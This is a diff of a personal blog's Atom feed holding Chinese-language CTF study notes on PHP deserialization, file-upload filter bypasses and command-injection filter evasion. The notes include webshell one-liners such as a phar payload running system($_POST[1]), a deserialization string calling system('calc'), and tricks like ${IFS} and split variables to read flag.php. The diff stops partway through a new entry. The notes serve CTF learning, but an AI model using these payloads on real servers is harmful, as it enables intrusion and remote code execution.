@@ -10,28 +10,30 @@
   <rights>All rights reserved 2026, Lao Zhen</rights>
   <subtitle>Welcome to laozhen’s blog</subtitle>
   <title>blog</title>
-  <updated>2026-10-29T12:22:09.518Z</updated>
+  <updated>2026-10-29T13:08:57.958Z</updated>
   <entry>
     <author>
       <name>Lao Zhen</name>
     </author>
     <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
     <content>
-      <![CDATA[<p><strong>eval</strong><br>表示将字符串用php代码执行</p><p>如</p><p>`&lt;?php</p><pre><code>$code = $_POST(&#39;code&#39;);eval=$code;</code></pre><p>?&gt;`</p><p>在一些场景中服务器发的是GET请求，但是你使用工具必须得换成POST请求，要进行一个转换</p><p><img src="/images/php-exec-2/01.webp"></p><p>比如说如图情况在后边加上？1&#x3D;eval($_POST);</p><p>就是把GET当作一个转接头，让GET请求执行POST命令</p><p><strong>回调函数</strong> &#x3D; 一个被当作参数传给别人的函数，由别人在合适的时机替你调用。<br>这个有很多用法，遇到不会的去看php中文手册</p><p><strong>RCE</strong></p><p>Command指操作系统的命令</p><p>system<br>passthru<br>exec<br>shell_exec<br>popen<br>pcntl_exec</p><p>执行运算符 <code>（shell_exec） // cat</code>echo ‘xxxx’ | base64 -d`</p><p>不会去看php中文手册</p>]]>
+      <![CDATA[<p>类与对象</p><p>用户类</p><p>属性和方法的集合</p><pre><code>class  user{    public $username;  //共有属性    private $password; //私有属性    protected $userType;    public static $platform=&quot;ctfshow&quot;;    //公共方法    public login(){        echo $this-&gt;password;    }    //公共方法    public logout(){    }}类的定义，我们可以认为是设计图//实例化一个类  从设计图转换为一个可以用的变量，变量类型不再是字符串或者数字，而是一个对象$u = new user(); 每个对象中，静态属性值，不变$p = new user();$u-&gt;username;$p-&gt;username;</code></pre><h4 id="类和对象的关系，类似于-设计图（蓝图）-与-生成出的产品-之间的关系"><a href="#类和对象的关系，类似于-设计图（蓝图）-与-生成出的产品-之间的关系" class="headerlink" title="类和对象的关系，类似于  设计图（蓝图） 与 生成出的产品 之间的关系"></a>类和对象的关系，类似于  设计图（蓝图） 与 生成出的产品 之间的关系</h4><p>属性的权限，可以分为：</p><p>1 public 权限 外部可以通过箭头访问到<br>2 private 权限 内部通过 $this-&gt;username 访问到<br>3 protected 权限 表示 自身及其子类 和父类 能够访问</p><p>类的继承</p><p>普通用户    vip用户   管理员用户</p><p>都属于user类  </p><pre><code>class normalUser extends user{    public $score;    public function play(){       echo  $this-&gt;userType;    }}$n = new normalUser();class vipUser extends user{    public $score;}class adminUser extends user{    public $score;}</code></pre><h4 id="方法的属性修饰符"><a href="#方法的属性修饰符" class="headerlink" title="方法的属性修饰符"></a>方法的属性修饰符</h4><p>public </p><p>private</p><p>protected</p><p>修饰：<br>静态属性   static</p><p>final属性   final</p><h4 id="类的分类"><a href="#类的分类" class="headerlink" title="类的分类"></a>类的分类</h4><p>1 普通类 没有任何修饰</p><pre><code>class user{    public function login(){    }    public function logout(){    }}</code></pre><p>2 抽象类</p><pre><code>abstract class user{        public function login(){    }    public function logout(){    }    abstract function play();}</code></pre><p>类里面的方法，有些是有详细的实现，有些就只有个方法名字，没具体实现</p><p>抽象类 不能被 new 也就是不能被直接 实例化对象</p><h4 id="3-接口-interface"><a href="#3-接口-interface" class="headerlink" title="3 接口 interface"></a>3 接口 interface</h4><p>为了实现多继承效果</p><p>extends user</p><p>implements 可以实现多个接口</p><h4 id="4-trait"><a href="#4-trait" class="headerlink" title="4 trait"></a>4 trait</h4><p>可以认为是代码段 ，方便复制粘贴</p><h4 id="5-匿名类"><a href="#5-匿名类" class="headerlink" title="5 匿名类"></a>5 匿名类</h4><pre><code>//一次性匿名类的例子$v-&gt;play(new class{    public $username=&quot;我是匿名类&quot;;});//核心思路 更类似于  伪协议的data伪协议</code></pre><h2 id="序列化于反序列化"><a href="#序列化于反序列化" class="headerlink" title="序列化于反序列化"></a>序列化于反序列化</h2><h4 id="serialize-序列化"><a href="#serialize-序列化" class="headerlink" title="serialize()序列化"></a>serialize()序列化</h4><p>把一个 PHP 变量（数组、对象……）打包成一段字符串</p><p>如果属性权限为private，那么序列化后，存储的属性名字为   %00+类名+%00+属性名</p><p>如果属性权限为protected，那么序列化后，存储的属性名字为   %00+*+%00+属性名</p><p>如果完全和属性长度一样就是public</p><p>序列化是  将 一个对象 变为一个可以传输的字符串  serialize(对象)  返回  序列化后的字符串</p><p>反序列化 就是将 一个可以传输的字符串 变为一个 可以调用的对象   unserialize(反序列化后的字符串) 返回 对象</p><pre><code>&lt;?phpclass Animal{    public $name;    function eat(){        echo &quot;i can eat&quot;;    }    function sleep(){        echo &quot;i can sleep&quot;;    }}$a = new Animal();echo serialize($a);// 对象-&gt; 字符串//O:6:&quot; &quot;:1:{s:4:&quot;name&quot;;N;}// O 有一个对象// : 下一句// 6 名字是6个字符// : 下一句//&quot;Animal&quot; 内容是Animal// : 下一句// 1 对象有一个属性// : 下一句// { 对象属性描述开始// s 属性是一个字符串 string// : 下一句// 4 属性名字是4个字符// : 下一句// &quot;name&quot; 属性名字是name// ; 属性名字描述完了// N 没有值，值为null// ; 属性值描述完了// } 对象属性描述完了class Animal{    public $name;}//结论//反序列化和类的方法无关，不能把类方法序列化//反序列化时，php会这么做// 1 找到反序列化字符串规定的类名字 // 2 实例化这个类，但是不是调用构造方法// 3 有了实例化的类对象，对它的属性进行赋值// 4 执行魔术方法// 5 返回构造好的对象</code></pre><p>1 接口是否可以序列化？</p><p>不可以,new不了</p><p>2 匿名类是否可以序列化？</p><p>不可以都没有名字</p><p>3 trait 是否可以序列化？</p><p>不可以trait了就不能new了</p><p>魔术方法</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>1 魔术方法是一类类的方法<br>2 会在序列化和反序列化及其他特殊情况下，自动执行</p><p>分类：</p><h5 id="1-construct"><a href="#1-construct" class="headerlink" title="1 __construct"></a>1 __construct</h5><p>在实例化一个对象(new)时，会被自动调用</p><p>不允许重复声明</p><p>可以作为非public权限属性的初始化</p><h5 id="2-sleep-和-wakeup方法"><a href="#2-sleep-和-wakeup方法" class="headerlink" title="2 __sleep 和 __wakeup方法"></a>2 __sleep 和 __wakeup方法</h5><p>序列化时自动调用__sleep方法</p><h5 id="3-destruct方法-析构方法"><a href="#3-destruct方法-析构方法" class="headerlink" title="3 __destruct方法 析构方法"></a>3 __destruct方法 析构方法</h5><p>类对象将要销毁，也就是脚本执行完毕后执行清理工作时自动执行</p><h5 id="4-call-和-callstatic"><a href="#4-call-和-callstatic" class="headerlink" title="4 __call 和__callstatic"></a>4 __call 和__callstatic</h5><p>  对象执行类不存在的方法时候，会自动调用__call方法</p><p>  直接执行类的不存在的静态方法时，会自动调用__callstatic方法</p><h5 id="5-get-set-和-isset-unset魔术方法"><a href="#5-get-set-和-isset-unset魔术方法" class="headerlink" title="5 __get __set 和 __isset __unset魔术方法"></a>5 __get __set 和 __isset __unset魔术方法</h5><p>__get  对不可访问属性或不存在属性 进行访问引用时自动调用</p><p>__set 对不可访问属性或不存在属性 进行写入时自动调用</p><h5 id="6-tostring-方法"><a href="#6-tostring-方法" class="headerlink" title="6 __tostring 方法"></a>6 __tostring 方法</h5><p>类的实例 和字符串进行拼接或者作为字符串引用时，会自动调用__tostring方法</p><h5 id="7-invoke方法"><a href="#7-invoke方法" class="headerlink" title="7 __invoke方法"></a>7 __invoke方法</h5><p>当类的实例被作为函数名字执行的时候，会自动调用__invoke方法</p><h5 id="8-set-state-方法"><a href="#8-set-state-方法" class="headerlink" title="8 __set_state 方法"></a>8 __set_state 方法</h5><p>文档中说 执行 var_export时自动调用</p><h4 id="9-debugInfo-方法的属性修饰符"><a href="#9-debugInfo-方法的属性修饰符" class="headerlink" title="9 __debugInfo 方法的属性修饰符"></a>9 __debugInfo 方法的属性修饰符</h4><p>执行var_dump时自动调用</p><h5 id="10-clone方法"><a href="#10-clone方法" class="headerlink" title="10 __clone方法"></a>10 __clone方法</h5><p>当使用clone关键字 ，clone一个对象时，会自动调用</p><h3 id="这里有很多我也不是很懂-慢慢学习吧"><a href="#这里有很多我也不是很懂-慢慢学习吧" class="headerlink" title="这里有很多我也不是很懂,慢慢学习吧"></a>这里有很多我也不是很懂,慢慢学习吧</h3><p>php的反序列化漏洞</p><p>1 有反序列化提交的入口</p><p>2 被反序列化的类的魔术方法，有可能被利用</p><p>1 绕过__wakeup方法</p><p>条件：</p><p>1 php5至php5.6.25  之间的版本可以绕过<br>2 php7到php7.0.10 直接的版本可以绕过</p><p>绕过方法：</p><p>反序列化字符串中表示属性数量的值  大于 大括号内实际属性的数量时 ，wakeup方法会被绕过</p><h4 id="2-绕过-号正则匹配"><a href="#2-绕过-号正则匹配" class="headerlink" title="2 绕过 +号正则匹配"></a>2 绕过 +号正则匹配</h4><p>参数有过滤，不让输入  O:数字  的形式，试图防止反序列化某个对象</p><p>O:数字 改为  O:+数字  就可以绕过上面的O:数字 过滤</p><h4 id="3-引用绕过相等"><a href="#3-引用绕过相等" class="headerlink" title="3 引用绕过相等"></a>3 引用绕过相等</h4><p>使用&amp;符号表示两个变量指向相同的内存引用地址</p><h4 id="4-16进制绕过"><a href="#4-16进制绕过" class="headerlink" title="4 16进制绕过"></a>4 16进制绕过</h4><p>反序列化后的字符串 不能出现某个关键单词时，可以使用大S绕过</p><p>O:8:”backdoor”:1:{s:4:”name”;s:10:”phpinfo();”;}</p><p>O:8:”backdoor”:1:{S:4:”n\97me”;s:10:”phpinfo();”;}</p><p>\97是a的asc码，</p><p>$data&#x3D;’O:8:”backdoor”:1:{S:4:”n\97me”;s:15:”system(&#39;calc&#39;);”;}’;</p><h4 id="5-exception-绕过"><a href="#5-exception-绕过" class="headerlink" title="5 exception 绕过"></a>5 exception 绕过</h4><p>不影响析构方法执行</p><h4 id="6-php反序列化字符逃逸"><a href="#6-php反序列化字符逃逸" class="headerlink" title="6 php反序列化字符逃逸"></a>6 php反序列化字符逃逸</h4><p>1 可以控制某个类中的属性值<br>2 间接控制了某个类的反序列化字符串<br>3 由于存在无脑过滤，字符增减，造成 描述中字符串的长度 和实际的不一致<br>4 从而能够逃逸出若干个字符，实现字符可控，从而闭合前面的双引号<br>5 实现反序列化字符串的完全可控</p><h3 id="因为博客转接图片都没了，这个应该会重新做一下"><a href="#因为博客转接图片都没了，这个应该会重新做一下" class="headerlink" title="因为博客转接图片都没了，这个应该会重新做一下"></a>因为博客转接图片都没了，这个应该会重新做一下</h3>]]>
     </content>
-    <id>http://example.com/2026/10/29/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2/</id>
-    <link href="http://example.com/2026/10/29/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2/"/>
-    <published>2026-10-29T12:20:40.492Z</published>
+    <id>http://example.com/2026/10/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
+    <link href="http://example.com/2026/10/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    <published>2026-10-29T13:08:21.000Z</published>
     <summary>
-      <![CDATA[<p><strong>eval</strong><br>表示将字符串用php代码执行</p>
-<p>如</p>
-<p>`&lt;?php</p>
-<pre><code>$code = $_POST(&#39;code&#39;);
-eval=$code;
-</code></pre]]>
+      <![CDATA[<p>类与对象</p>
+<p>用户类</p>
+<p>属性和方法的集合</p>
+<pre><code>class  user{
+    public $username;  //共有属性
+    private $password; //私有属性
+    protected $us]]>
     </summary>
-    <title>php代码执行2</title>
-    <updated>2026-10-29T12:22:09.518Z</updated>
+    <title>php反序列化</title>
+    <updated>2026-10-29T13:08:57.958Z</updated>
   </entry>
   <entry>
     <author>
@@ -39,75 +41,85 @@ eval=$code;
     </author>
     <category term="工具分享" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
     <content>
-      <![CDATA[<p>很多人都会遇到这种想进行截图学习，但无法进行截图的情况<br><img src="/images/jietu/01.webp"><br>推荐一个强制截图的模块（需要 root）<br>第一步安装 lsposed，启用截图模块，shizuku<br>第二步在 root 软件中安装 lsposed<br>第三步在连接 shizuku，在 lsposed 上安装模块<br>第四步重启，在通知栏，看到 lsp 页面通知则为成功，然后就可以正常使用了<br><img src="/images/jietu/02.webp"><br><img src="/images/jietu/03.webp"><br>LSPosed官网：<a href="https://lsposed.cn/lsposed">LSPosed-LSPosed中文网</a><br>模块下载地址：<a href="https://github.com/LSPosed/LSPosed/releases">点击下载 LSPosed</a></p>]]>
+      <![CDATA[<p>很多人都会遇到这种想进行截图学习，但无法进行截图的情况</p><p><img src="/images/jietu/01.webp"></p><p>推荐一个强制截图的模块（需要 root）</p><p>第一步安装 lsposed，启用截图模块，shizuku</p><p>第二步在 root 软件中安装 lsposed</p><p>第三步在连接 shizuku，在 lsposed 上安装模块</p><p>第四步重启，在通知栏，看到 lsp 页面通知则为成功，然后就可以正常使用了</p><p><img src="/images/jietu/02.webp"></p><p><img src="/images/jietu/03.webp"></p><p>LSPosed官网：<a href="https://lsposed.cn/lsposed">LSPosed-LSPosed中文网</a></p><p>模块下载地址：<a href="https://github.com/LSPosed/LSPosed/releases">点击下载 LSPosed</a></p>]]>
     </content>
     <id>http://example.com/2026/10/29/%E5%AE%89%E5%8D%93%E5%BC%BA%E5%88%B6%E6%88%AA%E5%B1%8F/</id>
     <link href="http://example.com/2026/10/29/%E5%AE%89%E5%8D%93%E5%BC%BA%E5%88%B6%E6%88%AA%E5%B1%8F/"/>
     <published>2026-10-29T11:30:00.000Z</published>
     <summary>
-      <![CDATA[<p>很多人都会遇到这种想进行截图学习，但无法进行截图的情况<br><img src="/images/jietu/01.webp"><br>推荐一个强制截图的模块（需要 root）<br>第一步安装 lsposed，启用截图模块，shizuku<br>第二步在 root 软件中]]>
+      <![CDATA[<p>很多人都会遇到这种想进行截图学习，但无法进行截图的情况</p>
+<p><img src="/images/jietu/01.webp"></p>
+<p>推荐一个强制截图的模块（需要 root）</p>
+<p>第一步安装 lsposed，启用截图模块，shizuku</p>]]>
     </summary>
     <title>安卓强制截屏</title>
-    <updated>2026-10-29T11:58:05.636Z</updated>
-  </entry>
-  <entry>
-    <author>
-      <name>Lao Zhen</name>
-    </author>
-    <content>
-      <![CDATA[<hr><h2 id="title-php代码执行catagories-ctf学习-暂时"><a href="#title-php代码执行catagories-ctf学习-暂时" class="headerlink" title="title: php代码执行catagories: - ctf学习(暂时)"></a>title: php代码执行<br>catagories:<br> - ctf学习(暂时)</h2><p>在php中，有下面6种函数可以执行系统命令<br>· system· passthru· exec· shell_exec· popen· pcntl_exec· 执行运算符 </p><p>在windows服务器上，我们可以执行windows的系统命令或者程序名称，例如calc、bat、vbs等等<br>在linux&#x2F;unix服务器上，我们可以执行linux的系统命令，例如cat cp nc等等</p><p>今天主要学习到几种php过滤方式以及应对策略，介绍一下</p><p>1.替换过滤<br>比如说把cat，替换成空格，我们就不能执行cat操作<br>此时我们可以使用tac或者是双写cat像这样：cacatt这样过滤后就是cat</p><p>2.过滤特定字符<br>比如说他过滤了flag，我们可以使用通配符*或者？进行补齐，？只能补齐一个字符。在移动文件等场景也会使用通配符。<br>2.1还可以通过b64加密再解码输出的形式输出</p><p>3.无回显<br>输入指令无回显，使用＆＆或者｜｜进行一个短路处理，就是说把执行的命令放左边，将右边的命令进行一个短路，右边的命令无回显，左边正常运行</p><p>4.拼接过滤<br>其实也是2的一种，如果防御者把b64或者echo过滤了可以用这种<br>如a&#x3D;c;b&#x3D;at;c&#x3D;fla;d&#x3D;g.php;$a$b ${c}${d}<br>等效于cat flag.php</p><p>5.符号过滤<br>比如说把空格过滤<br>读文件时可以用&lt;&gt;<br>或者用＄{IFS}<br>或者用控制字符代替如%01，找不到控制字符时可以爆破试试<br>万不得已可以在源代码找到这个符号，然后根据源代码的位置将这个符号进行输出如<br>echo ${hajbsh:12:1}<br>输出hajb后十二个字符后第一个字符</p>]]>
-    </content>
-    <id>http://example.com/2026/10/29/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
-    <link href="http://example.com/2026/10/29/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-    <published>2026-10-29T10:59:51.128Z</published>
-    <summary>
-      <![CDATA[<hr>
-<h2 id="title-php代码执行catagories-ctf学习-暂时"><a href="#title-php代码执行catagories-ctf学习-暂时" class="headerlink" title="title: php代码执行catagorie]]>
-    </summary>
-    <updated>2026-10-29T12:17:17.304Z</updated>
-  </entry>
-  <entry>
-    <author>
-      <name>Lao Zhen</name>
-    </author>
-    <category term="工具分享" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    <content>
-      <![CDATA[<p>进入首页随便点击一个视频<br><img src="/images/vip/01.jpg"><br>点击右上角三角形，点击解析<br><img src="/images/vip/02.jpg"><br><img src="/images/vip/03.jpg"><br>即可观看<br><img src="/images/vip/04.jpg"><br>下载地址<br><a href="https://xiaowunetwork.lanzoum.com/ityLJ4bdwish">https://xiaowunetwork.lanzoum.com/ityLJ4bdwish</a></p>]]>
-    </content>
-    <id>http://example.com/2026/10/29/vip%E8%A7%86%E7%95%8C/</id>
-    <link href="http://example.com/2026/10/29/vip%E8%A7%86%E7%95%8C/"/>
-    <published>2026-10-29T10:51:35.377Z</published>
-    <summary>
-      <![CDATA[<p>进入首页随便点击一个视频<br><img src="/images/vip/01.jpg"><br>点击右上角三角形，点击解析<br><img src="/images/vip/02.jpg"><br><img src="/images/vip/03.jpg"><br>即可]]>
-    </summary>
-    <title>vip视界</title>
-    <updated>2026-10-29T12:03:23.932Z</updated>
+    <updated>2026-10-29T12:38:04.090Z</updated>
   </entry>
   <entry>
     <author>
       <name>Lao Zhen</name>
     </author>
     <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
     <content>
-      <![CDATA[<p>1.git泄露</p><p>git泄露就是服务器意外泄露了.git目录</p><p>形式像这样……&#x2F;baidu.com&#x2F;.git&#x2F;注意要有.和&#x2F;</p><p>如果显示403可用githack脚本将数据下载到本地<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>2.robots泄露</p><p>这个就是一个文本，告诉爬虫者哪些可以抓取哪些不能抓，也变相告诉渗透者重要信息在哪</p><p>User-agent: *<br>Disallow: &#x2F;admin&#x2F;<br>Disallow: &#x2F;backup&#x2F;<br>Disallow: &#x2F;db&#x2F;<br>Disallow: &#x2F;api&#x2F;internal&#x2F;<br>Disallow: &#x2F;config.php</p><p>发现形式就是……&#x2F;baidu.com&#x2F;robots.txt直接进入即可</p>]]>
+      <![CDATA[<p>php的文件上传</p><p>&#x2F;tmp&#x2F;php??????</p><p>这个是上传文件在linux下的临时目录</p><h2 id="1-php的文件上传绕过-黑名单绕过"><a href="#1-php的文件上传绕过-黑名单绕过" class="headerlink" title="1 php的文件上传绕过 黑名单绕过"></a>1 php的文件上传绕过 黑名单绕过</h2><p><img src="/images/php-upload/01.webp"></p><p>后缀替换为空时，我们通过提交  1.pphphp 替换php为空后，得到1.php   成功写入木马</p><pre><code>&lt;form action=&quot;index.php&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;    &lt;input name=&quot;file&quot; type=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;&lt;/form&gt;</code></pre><p>这个是文件上传的代码<br>比如说可以在index.php中写入一句话木马进行上传</p><p>php3 php5 phps phtml</p><p>php后缀替换为txt时，我们无法双写绕过，1.pphphp  1.ptxthp</p><h3 id="2-php文件上传的00截断-老洞，无价值"><a href="#2-php文件上传的00截断-老洞，无价值" class="headerlink" title="2 php文件上传的00截断(老洞，无价值)"></a>2 php文件上传的00截断(老洞，无价值)</h3><p>hello world</p><p>hello空格world\n\00</p><p>123.php  明显不让直接上传</p><p>123.php%00.jpg 那么后台判断的时候，取最后一个点后面的字符作为后缀  jpg  看起来是合法的文件名称</p><p>.&#x2F;upload&#x2F;123.php%00.jpg   -&gt;  .&#x2F;upload&#x2F;123.php</p><p>00字符截断需要的版本</p><p>php版本小于5.3.4  而最新的php版本已经达到8.1<br>java版本小于7u40,而最新的java版本已经达到20以上<br>所以说已经没有实战价值了，古老漏洞</p><h3 id="3-iconv字符转换异常后造成了字符截断-老洞，无价值"><a href="#3-iconv字符转换异常后造成了字符截断-老洞，无价值" class="headerlink" title="3 iconv字符转换异常后造成了字符截断(老洞，无价值)"></a>3 iconv字符转换异常后造成了字符截断(老洞，无价值)</h3><p>php在文件上传场景下的文件名字符集转换时，可能出现截断问题</p><p>utf-8字符集  默认的字符编码范围的是0x00-0x7f</p><p>iconv转换的字符不在上面这个范围之内，低版本的php会报异常，报了异常以后，后续字符不再处理</p><p>就会造成截断问题</p><p>123.php%00.jpg   123.php</p><p>php版本低于5.4才可以使用</p><h3 id="4-文件后缀是白名单的时候的绕过"><a href="#4-文件后缀是白名单的时候的绕过" class="headerlink" title="4 文件后缀是白名单的时候的绕过"></a>4 文件后缀是白名单的时候的绕过</h3><p>白名单：只准上传这几个后缀   因为匹配的内容少  所以限制的范围就大<br>黑名单：不准上传这几个后缀   因为匹配的内容多  所以限制的范围就小 仅限于自己制定的几个，除了这几个，其他都行</p><h4 id="1）-web服务器的解析漏洞绕过"><a href="#1）-web服务器的解析漏洞绕过" class="headerlink" title="1） web服务器的解析漏洞绕过"></a>1） web服务器的解析漏洞绕过</h4><p>phtml,php3,phps,php5</p><p>当php被禁用时也可以使用这几个后缀</p><h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><h4 id="a-多后缀解析漏洞-当我们上传apache不认识的后缀时，apahce会继续往前找后缀，找到认识的就解析执行"><a href="#a-多后缀解析漏洞-当我们上传apache不认识的后缀时，apahce会继续往前找后缀，找到认识的就解析执行" class="headerlink" title="a 多后缀解析漏洞  当我们上传apache不认识的后缀时，apahce会继续往前找后缀，找到认识的就解析执行"></a>a 多后缀解析漏洞  当我们上传apache不认识的后缀时，apahce会继续往前找后缀，找到认识的就解析执行</h4><p>123.txt.ctf  123.txt  文本文档形式解析</p><p>123.php.ctf  123.php  就交给中间件处理php脚本</p><h4 id="b-ImageMagic组件白名单绕过"><a href="#b-ImageMagic组件白名单绕过" class="headerlink" title="b ImageMagic组件白名单绕过"></a>b ImageMagic组件白名单绕过</h4><p>目标主机按照了这个漏洞版本的ImageMagic插件 &lt;&#x3D;3.3.0<br>在php.ini中启用了这个插件<br>通过了php new Imageick 对象的方式来处理图片时<br>且 php版本大于 5.4时</p><p>才可以使用，上传特定的svg图片，来实现组件的缺陷导致任意代码执行</p><h5 id="nginx-基于错误的nginx配置-和-php-fpm配置，当我们访问-123-txt-123-php"><a href="#nginx-基于错误的nginx配置-和-php-fpm配置，当我们访问-123-txt-123-php" class="headerlink" title="nginx  基于错误的nginx配置 和 php-fpm配置，当我们访问  123.txt&#x2F;123.php"></a>nginx  基于错误的nginx配置 和 php-fpm配置，当我们访问  123.txt&#x2F;123.php</h5><p>cgi.fix_pathinfo 默认开启  123.txt&#x2F;123.php  当123.php不存在时，会找&#x2F;前面的文件进行php解析，这时候，就成功解析了123.txt为php脚本了</p><p>如图</p><p><img src="/images/php-upload/02.webp"></p><p>iis   Windows下使用  iis6.0版本中，如果解析的目录名字为 xxx.asp 那么里面的所有文件，都会按照asp来解析 123.txt  WindowsXP  Windows Server 2003</p><h2 id="高级文件绕过"><a href="#高级文件绕过" class="headerlink" title="高级文件绕过"></a>高级文件绕过</h2><h3 id="1-htaccess-nginx-htaccess"><a href="#1-htaccess-nginx-htaccess" class="headerlink" title="1  .htaccess nginx.htaccess"></a>1  .htaccess nginx.htaccess</h3><p>php.ini     ，这个是php配置文件</p><p>虚拟主机时代     一个物理服务器，里面可能存放几十上百个网站   每个网站，一个目录</p><p>A 网站  需要这样的php.ini配置<br>B 网站  却需要那样的php.ini配置<br>C 网站  又需要另外的php.ini配置</p><p>总的php.ini不动，A B C 3个网站分别在自己目录定义自己的配置，作用域也仅限于自己目录</p><p>自定义配置文件   .htaccess nginx.htaccess</p><p>在nginx 下，默认使用.user.ini 配置文件来进行php的配置</p><p>使用</p><p>auto_append_file&#x3D;123.txt  来让任意的php文件包含123.txt，执行里面的php代码</p><p>疑问：为什么使用.user.ini来自动附加文件的时候，需要一个php文件呢</p><h3 id="2-服务端内容检测"><a href="#2-服务端内容检测" class="headerlink" title="2 服务端内容检测"></a>2 服务端内容检测</h3><p>不局限检测文件名，还会检测文件的后缀 文件的内容</p><pre><code>&lt;?php system eval $_POST</code></pre><p>二分法确定出被检测的关键字，使用替代语法绕过</p><p>如果说php头被禁用了，或许可以采用script写法,如</p><pre><code>&lt;script language=&quot;php&quot;&gt;phpinfo;&lt;/script&gt;</code></pre><h3 id="3-配合伪协议来绕过"><a href="#3-配合伪协议来绕过" class="headerlink" title="3 配合伪协议来绕过"></a>3 配合伪协议来绕过</h3><p>比如说这么进行操作</p><p><img src="/images/php-upload/03.webp"></p><h4 id="4-配置日志包含绕过"><a href="#4-配置日志包含绕过" class="headerlink" title="4 配置日志包含绕过"></a>4 配置日志包含绕过</h4><p><img src="/images/php-upload/04.webp"></p><p>创建user-agent,进行恶意代码上传，注意只有一次机会，如果输入错误环境会混乱</p><p><img src="/images/php-upload/05.webp"></p><h4 id="5-上传html来xss-执行跨站脚本"><a href="#5-上传html来xss-执行跨站脚本" class="headerlink" title="5 上传html来xss 执行跨站脚本"></a>5 上传html来xss 执行跨站脚本</h4><p>这个还不会</p><h4 id="6-getimagesize函数绕过"><a href="#6-getimagesize函数绕过" class="headerlink" title="6 getimagesize函数绕过"></a>6 getimagesize函数绕过</h4><p>getimagesize函数来检测是不是图片，而不采取其他措施的情况下，如果一旦绕过getimagesize函数，就可以实现任意文件上传</p><p>XBM 格式图片</p><p>#define %s %d 这种形式，就认为时XBM图片的高或者宽</p><p><img src="/images/php-upload/06.webp"></p><h4 id="7-png二次渲染绕过"><a href="#7-png二次渲染绕过" class="headerlink" title="7 png二次渲染绕过"></a>7 png二次渲染绕过</h4><p>正常做法：move_uploaded_file 方式移动我们上传的临时文件到上传目录去</p><p>二次渲染做法：通过imagepng方法来，来动态依据我们上传的图片的二次生成一个png图片 里面的php代码就会被清洗掉</p><p>所以，我们需要使用特殊的方式，来构造我们的图片</p><p>我这里有一个脚本进行构造</p><p>得到图片之后进行抓包修改，将参数改回原有的地方，注意我在脚本中使用了GET[0],要在后边加上&amp;&#x3D;system,这个你们看不到，在脚本里，下边添加恶意代码</p><p><img src="/images/php-upload/07.webp"></p><h4 id="8-jpg二次渲染绕过"><a href="#8-jpg二次渲染绕过" class="headerlink" title="8 jpg二次渲染绕过"></a>8 jpg二次渲染绕过</h4><p>使用专用图来生成jpg木马，实现经过二次渲染后，我们的恶意代码，依然能够保留在图片中，通过文件包含，执行里面的php代码</p><p>这个是有概率成功的，看运气，不推荐使用</p><h4 id="9-phar文件上传绕过"><a href="#9-phar文件上传绕过" class="headerlink" title="9 phar文件上传绕过"></a>9 phar文件上传绕过</h4><p>这个我不太会</p><p>首先要在php配置文件中搜索readonly将这里改成off，<strong>去掉前面分号</strong>，不然生成不了配置文件</p><p><img src="/images/php-upload/08.webp"></p><pre><code>&lt;?php$phar = new Phar(&#39;phar.phar&#39;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;&lt;?php system($_POST[1]); ?&gt;&quot;);$phar-&gt;stopBuffering();</code></pre><p>这个是一个phar生成脚本，执行后会生成一个phar.phar脚本，里面包含了我们的恶意代码，这时候进行文件上传执行恶意代码RCE</p>]]>
     </content>
-    <id>http://example.com/2026/10/29/git%E6%B3%84%E9%9C%B2%E5%92%8Croobots%E6%B3%84%E9%9C%B2/</id>
-    <link href="http://example.com/2026/10/29/git%E6%B3%84%E9%9C%B2%E5%92%8Croobots%E6%B3%84%E9%9C%B2/"/>
-    <published>2026-10-29T09:29:06.126Z</published>
+    <id>http://example.com/2026/10/21/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
+    <link href="http://example.com/2026/10/21/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <published>2026-10-21T03:47:12.000Z</published>
     <summary>
-      <![CDATA[<p>1.git泄露</p>
-<p>git泄露就是服务器意外泄露了.git目录</p>
-<p>形式像这样……&#x2F;baidu.com&#x2F;.git&#x2F;注意要有.和&#x2F;</p>
-<p>如果显示403可用githack脚本将数据下载到本地<a href="]]>
+      <![CDATA[<p>php的文件上传</p>
+<p>&#x2F;tmp&#x2F;php??????</p>
+<p>这个是上传文件在linux下的临时目录</p>
+<h2 id="1-php的文件上传绕过-黑名单绕过"><a href="#1-php的文件上传绕过-黑名单绕过" class="]]>
     </summary>
-    <title>git泄露和roobots泄露</title>
-    <updated>2026-10-29T10:48:38.997Z</updated>
+    <title>php文件上传</title>
+    <updated>2026-10-29T12:50:56.683Z</updated>
   </entry>
   <entry>
     <author>
       <name>Lao Zhen</name>
     </author>
     <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    <content>
